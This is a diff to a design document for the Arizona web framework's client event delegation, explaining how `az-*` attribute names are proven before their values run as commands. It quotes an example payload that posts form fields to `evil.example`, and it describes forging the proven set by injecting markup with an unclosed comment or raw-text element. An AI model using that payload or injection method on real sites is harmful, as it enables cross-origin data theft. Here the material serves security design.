@@ -26,7 +26,7 @@ always true, `sendEvent` warns and drops (`push_event "<name>" dropped: this pag
 `navigate`/`leavePage` load the URL as a page (`loadPage`, http(s) only), and a transition waits for
 no reply. It exports `start`, `executeJS`, `exitPip`, `requestPip`, `mountHooks`, `hooks`, `get`,
 `set`, `setAll`. `start({attrs}?)` binds delegation, notes the event names (`attrs`, else the JSON
-list `arizona_static` embedded in `#arizona-attrs`), mounts hooks, and returns an idempotent `stop`
+list `arizona_static` embedded in `#arizona-attrs`, read by the shared `embeddedAttrs`), mounts hooks, and returns an idempotent `stop`
 (unbinds, closes PiP windows, destroys hooks); a second `start()` stops the first. The host member
 `ready` -- whether delegated commands run now -- is the socket being open on a live page. The static
 bundle must never grow a Worker or a socket: anything it needs from the live side goes through
@@ -92,9 +92,44 @@ command-versus-data question is answerable, and the delivery uses both (`arizona
   `"a"` on the **same frame** that first renders the markup, so the type is bound before anything
   can trigger it. After connect, frames carry no `"a"` at all unless something new was proved.
 
+**The page carries its set too, so it is known before the socket opens.** The connect frame lands
+a round trip after the open, and a click in that window -- or an HTTP-form `az-submit` `fetch`,
+which runs with no socket at all -- must find its proof. So the HTTP render arms the same
+collector for the page and embeds the union (`arizona_event_attrs:embed/2`, the render target's
+`static_document/2`: `<script type="application/json" id="arizona-attrs">` appended after the
+document, which the HTML parser moves into the body as its last element), exactly as
+`arizona_static` does for a static page -- an empty set too -- and `connect()` reads it
+(`embeddedAttrs`) before anything can fire, or, when it runs while the document is still parsing
+(the layout's inline `connect` before `</body>`), on `DOMContentLoaded` **only**: the embed comes
+after the page, so a read then could find only an element the page content holds, and proofs only
+add. The client takes the **last** `script[type="application/json"]` with that id: an id can come
+from user input, so an earlier element sharing it would otherwise win, and escaped content cannot
+create a script element. Embedding even an empty set guards only against an element injected ahead
+of the real embed in the normal flow; it does **not** stop a forged set. `?raw` is trusted markup,
+and an app that splices untrusted markup through it can forge the proven set: an injected embed
+followed by an unclosed `<!--` (or a raw-text or RCDATA element left unclosed, e.g. `textarea`,
+`title`, `style`, `script`, `xmp`, `iframe`, `noembed`, `noframes`, `plaintext`, or `noscript` with
+scripting on) swallows the real embed, leaving the forged one the last match. Under a strict CSP,
+where the injected markup cannot run a script of its own, that is what turns its `az-*` data into
+commands, since the allowed client script (a head module, a deferred `connect()`) reads it. It is
+not required to be the body's last element: a deferred or module script may append to the body
+before `DOMContentLoaded`. A page without the embed (a `?json` document, a page
+rendered another way) has no proofs until the connect frame, and runs nothing before it.
+There is **no bootstrap set**: delegating common types (`click`, `change`, ...) ahead of any proof
+used to cover that window, and it ran app data under those names as commands -- an
+`az-change='[22,"https://evil.example",{}]'` posted the form's fields to another origin.
+
 The worker relays each frame's `"a"` as field 4 of
 `postMessage([0, ops, effects, firstAfterReconnect, azNames])`; the main thread decides which names
-are events and unions monotonically.
+are events and unions monotonically, over what the page embedded.
+
+**Every executor gates on the proven set (`_eventTypes`), never on which listeners exist.** The
+generic listeners are bound only for proven types, which is the only way one gets bound. The
+dedicated `submit` and `drop` listeners are bound on every page (they carry bookkeeping), so each
+asks `proven` before parsing its attribute; an unproven `az-submit` is still `preventDefault`ed
+(see below) and runs nothing. The reconnect replay re-runs only a form's `az-change`, and only
+when `az-change` is proven; no field's handler is replayed. A `submit` or `drop` proof is
+recorded beside the others but binds no generic listener (`DEDICATED`).
 
 Deriving the set from rendered bytes instead was tried and abandoned. A regex over serialized HTML
 cannot tell an attribute NAME from `az-` text inside an attribute VALUE, so user content echoed
@@ -106,14 +141,22 @@ structural, not bugs to patch.
 construction (an effect is always a call, never a literal), a bare or boolean attribute has no
 value to hold a command, and an opaque dynamic that never evaluates to a command is data too --
 `{az_select, ?get(ids)}` rendering `az-select="[1,2,3]"` never enters the set, `select` is never
-delegated, and the value never reaches the command interpreter. That matters because a command list
+delegated, and the value never reaches the command interpreter -- nor when it changes: a diff op
+writing it, like a `?local` attribute write, proves nothing, since the server ships a command a
+diff turns up as a JSON array and proves its name on that same frame, so a string value in an op
+is always data. That matters because a command list
 is a bare JSON array (`arizona_effect:encode/1` emits a single command unwrapped, `[0,"inc"]`), so
 `[1,2,3]` is a structurally valid command -- `toggle` with selector `2` -- and **no client-side
 inspection of the value can separate the two**. Delegating on guesswork would both leave declared
 events dead and hand app data (possibly attacker-influenced) to the command interpreter; the typed
-proofs above are what make neither happen. The delegated dispatch still wraps parse AND execution
-in a warn-once containment, because a proven name can share the DOM with same-named app data (a
-runtime `set_attr`, host markup).
+proofs above are what make neither happen. The proof is per **name**, not per element: a name
+proven anywhere on the page runs a same-named data value elsewhere on it (`az-change` proven on one
+form makes another form's `az-change` data a command list), so never render untrusted data under
+an `az-*` name the page also uses for commands. Nor is it per route: proofs accumulate for the life
+of the page, across SPA `navigate`/`patch` and reconnects, so a name proven before a navigate stays
+proven on the next route (compile-time names are app-wide anyway). Per-element marking would be a separate design. The
+delegated dispatch still wraps parse AND execution in a warn-once containment for the same reason
+(a runtime `set_attr`, host markup).
 
 **Two listeners per type, split on the event's own `bubbles` flag**, because one phase cannot serve
 both kinds:
@@ -145,7 +188,7 @@ browser's scroll fast path for the whole page, so an app that only wants to *obs
 would pay scroll jank it never asked for. `az-prevent-default` is recorded in every attribute form
 (it is the one directive the client reads out of the declared set), so on the common path its
 presence is known before the first listener is registered. When the declaration arrives **after** a
-forced-passive type was bound (a later delta frame, a runtime attribute write), the client
+forced-passive type was bound (a later delta frame, a `set_attr` effect), the client
 re-registers those listeners non-passive (`declarePreventDefault`) -- passive is fixed at
 registration, so without the rebind the page would keep ignoring the `preventDefault` it declared.
 The flag must be **stated in both directions**: omitting it entirely makes Chromium register
@@ -154,9 +197,9 @@ The flag must be **stated in both directions**: omitting it entirely makes Chrom
 **`submit` and `drop` are deliberately not delegated generically.** They name real DOM events *and*
 have dedicated listeners (submit flushes pending debounced inputs, honors `az-form-reset`, and
 defers the reset to a `fetch` response; drop carries the drag bookkeeping), so delegating them as
-well would run their commands twice. They sit in `AZ_DIRECTIVES` beside the `az-*` names that are
-directives rather than events. The flush covers the form's own slots too (a form-level
-`az-debounce` paces the field events it delegates), and a submit is never debounced itself --
+well would run their commands twice. They sit in `DEDICATED`: recorded as proven like any event,
+never bound generically, beside the `AZ_DIRECTIVES` that name no event at all. The flush covers
+the form's own slots too (a form-level `az-debounce` paces the field events it delegates), and a submit is never debounced itself --
 `az-debounce="blur"` on a form would otherwise never send it -- while `az-throttle` still paces
 a `push_event` submit (a second submit inside the window becomes its trailing send). No flush
 touches the submit's own slot -- not the submit flush, nor a blur or event-name flush on the
@@ -173,7 +216,9 @@ submits it with the form's own method -- a GET by default, putting every field (
 included) in the URL -- which is what happened before the first open and during reconnect backoff.
 That holds for a form with an explicit `method`/`action` too: it no longer falls back to a native
 submission while disconnected. The listener always calls `preventDefault`, then decides by what
-the commands need (`socketNeeds`):
+the commands need (`socketNeeds`) -- when `az-submit` is proven. An unproven one runs nothing and
+is a drop like the disconnected one below (a warning and `arizona:submit-dropped` with
+`detail: {reason: 'unproven'}`): its value is app data, or its proof has not arrived yet.
 
 - **An SPA `navigate`/`patch` alone** (top level or under `transition`) degrades to a full load of
   its URL (`location.assign`, or `location.replace` for a `replace` navigate), exactly what a
@@ -184,7 +229,9 @@ the commands need (`socketNeeds`):
   the rest would apply half a submission and discard the typed fields. Every drop warns and
   dispatches a non-cancelable, bubbling `arizona:submit-dropped` `CustomEvent` on the form,
   `detail: {reason: 'disconnected'}`, so the app can tell the user.
-- **A `fetch` or client-only list** runs: an HTTP login form needs no socket.
+- **A `fetch` or client-only list** runs: an HTTP login form needs no socket. It runs under the
+  page's embedded proof of `az-submit`, so on a page without the embed it is dropped as
+  `unproven` until the connect frame proves the name.
 
 Queueing for the reconnect was rejected: a submit replayed seconds later, against a view the resync
 may have remounted, is not what the user pressed. To disable the submit button while down, style it
@@ -202,12 +249,23 @@ imply nothing.
 
 **Three cases the compile-time set cannot cover, and how each is handled:**
 
-- **A runtime attribute write** (`arizona_js:set_attr(sel, "az-toggle", ...)`) uses a name no
-  template contains. Every such write funnels through `applySetAttrOp`, which records the name it
-  just wrote.
+- **A runtime `set_attr`/`toggle_attr` effect writing a command**
+  (`arizona_js:set_attr(Sel, ~"az-toggle", Cmd)`) uses a name no template contains. The server
+  ships the command as a JSON array, and the effect records the name before writing it: the
+  command that wrote it was itself proven (it ran under a proven name, or a handler returned it).
+  It is the only attribute write that proves a name, and only with a non-empty array value (a
+  `toggle_attr/4` proving it per match, when it writes that value): a binary under an `az-*` name
+  (`set_attr(Sel, ~"az-select", ~"[1,2,3]")`), `[]` (no command, clearing a handler) and a
+  `toggle_attr/2` presence toggle record nothing (`noteAzAttr(name, false)` still reads `az-prevent-default`, which
+  runs nothing). `applySetAttrOp` itself records nothing, so the diff path (`OP_SET_ATTR`, an
+  `OP_ITEM_PATCH` inner op) and a `?local` attribute slot, which carry app data, never do.
 - **`?raw` markup and host-inserted DOM** declare nothing the compiler saw. Call the exported
   `mountHooks` on it, the same contract hooks already have; it walks with `getAttributeNames()`,
-  which is exact because the parser already did the parsing. Calling it on already-mounted markup is
+  which is exact because the parser already did the parsing. That call **is** the proof: every
+  `az-*` name on the markup becomes a proven type for the page, so call it only on markup whose
+  `az-*` attributes the host wrote itself, never on markup holding untrusted data. Pass only that
+  subtree, never `document` or a server-rendered view: a scan there proves the names of every
+  data value on it (`{az_select, ?get(ids)}`). Calling it on already-mounted markup is
   safe (`mountHook` returns early for an element it already tracks).
 - **Window-targeted events** (`resize`, `online`/`offline`, `hashchange`, `popstate`, `storage`)
   are not delegated at all: delegation binds on Documents, and their propagation path does not
@@ -264,6 +322,8 @@ batch.
 A slot binds either element **content** or an **attribute value**; the descriptor rides on the reserved `az-local` attribute, which is why a template may not write `az-local` (or `az`) itself. Both writers go through `writeLocalValue(el, target, value)`, so a content slot and an attribute slot update the same way from the caller's view. An attribute write goes through the canonical `applySetAttrOp`/`applyRemAttrOp` in both directions -- `false`/`null` removes through `applyRemAttrOp`, so it unchecks, deselects or clears a control the user already changed, exactly as `true` checks it -- and an interpolated slot renders `null`/`undefined` as empty. `set`/`setAll` on a missing view or key are silent no-ops.
 
 Every item of an `?each` shares the slot **key** (keys are compile-time literals), so a `set` hits all of them; `?local` cannot hold per-item independent client state.
+
+A `?local` under an `az-*` name must **start** as a command: only that initial value proves the name, at compile time. `{az_click, ?local(~"act", ~"")}` records nothing, and a later `set` never proves `click`, even with a command array -- the slot writes through `applySetAttrOp`, which records nothing, because a `?local` value is client-side data.
 
 ## Navigation scroll behavior
 
